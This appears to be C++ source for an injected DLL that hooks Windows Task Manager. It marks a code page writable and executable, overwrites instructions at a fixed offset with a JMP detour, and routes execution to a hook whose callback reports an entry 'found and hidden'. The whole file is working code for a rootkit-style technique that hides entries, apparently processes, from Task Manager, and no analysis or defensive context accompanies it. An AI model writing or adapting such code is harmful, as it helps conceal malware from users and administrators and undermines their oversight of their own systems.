#include "pch.h"
#include "dllhook.h"

#include <Windows.h>
#include <cstdint>

#define SS_HOOK_OFFSET 0x5d26e
#define SS_JMPB_OFFSET 0x5d280

EXTERN_C DWORD64 gRetAddress = 0;
EXTERN_C DWORD64 gContinueAddress = 0;
debug gd;

EXTERN_C void hook();

// Grants Read, Write and Execute permissions to a memory page for hook placement. Returns the replaced protection value.
DWORD SsGrantRWXToMemoryPage(void* MemoryPage, uint32_t Size, debug d)
{
    DWORD oldProtection = 0;
    if (!VirtualProtect(MemoryPage, Size, PAGE_EXECUTE_READWRITE, &oldProtection))
    {
        d.out("[E] VirtualProtect failed with error code %d: MemPage 0x%p, Size %d.\n", GetLastError(),
            MemoryPage, Size);

        return NULL;
    }

    return oldProtection;
}

EXTERN_C void callback()
{
    printf("[I] Entry found and hidden.\n");
}

// Given a Protection value constant, sets a memory page to that protection value. Returns true if successful.
bool SsRestoreMemoryPageProtection(void* MemoryPage, uint32_t Size, DWORD Protection, debug d)
{
    DWORD oldProtection = 0;    // this is here just because it is a mandatory parameter.

    if (!VirtualProtect(MemoryPage, Size, Protection, &oldProtection))
    {
        d.out("[E] VirtualProtect failed with error code %d: MemPage 0x%p, Size %d.\n", GetLastError(),
            MemoryPage, Size);

        return false;
    }

    return true;
}

// Places an 0xE9 JMP instruction with relative address at the specifed memory address towards the hook function.
void SsPlaceJMPDetour(unsigned char* MemAddress, unsigned char* Function, uint32_t Size, debug d)
{
    d.out("[I] Placing hook at 0x%p to 0x%p.\n", MemAddress, Function);
    // First set the memory area to be modified to the NOP instruction (opcode 0x90)
    memset(MemAddress, 0x90, Size);

    // Place the detour
    // 0xFF 0x25 is a JMP instruction which takes a r/m64 argument. Performs a direct to a memory address supplied as the next immediate value.
    *(WORD*)MemAddress = 0x25ff;
    // 32 bit displacement (because Reg=0b101)
    *(DWORD*)((DWORD64)MemAddress + 2) = 0;
    // The memory address to perform the jump to.
    *(DWORD64*)((DWORD64)MemAddress + 6) = (DWORD64)Function;

    // Hook has been placed, return.
    d.out("[S] Hook placed.\n");
    return;
}

bool SsPlaceHook(unsigned char* BaseAddress, debug d)
{
    // Make the hook instruction in the injected process writable
    DWORD ProtectionToRestore = SsGrantRWXToMemoryPage((void*)(BaseAddress + SS_HOOK_OFFSET), 18, d);
    if (!ProtectionToRestore)
        return false;

    // Calculate the addresses to the jump to the start of the loop and the jump to the next
    // instruction in Task Manager.
    gRetAddress = ((DWORD64)BaseAddress + SS_JMPB_OFFSET);
    gContinueAddress = ((DWORD64)BaseAddress + SS_HOOK_OFFSET) + 18;

    d.out("[I] Hook func addr: 0x%p, Return address: 0x%llx, Continue address: 0x%llx.\n", hook, gRetAddress, gContinueAddress);

    // Place the detour
    SsPlaceJMPDetour((BYTE*)(BaseAddress + SS_HOOK_OFFSET), (BYTE*)hook, 18, d);

    // Restore the original page protection (does not work)
    SsRestoreMemoryPageProtection((void*)(BaseAddress + SS_HOOK_OFFSET), 18, ProtectionToRestore, d);

    // If the hook has been placed, return true
    d.out("[S] Hooking successful at 0x%llx\n", (BaseAddress + SS_HOOK_OFFSET));
    return true;
}
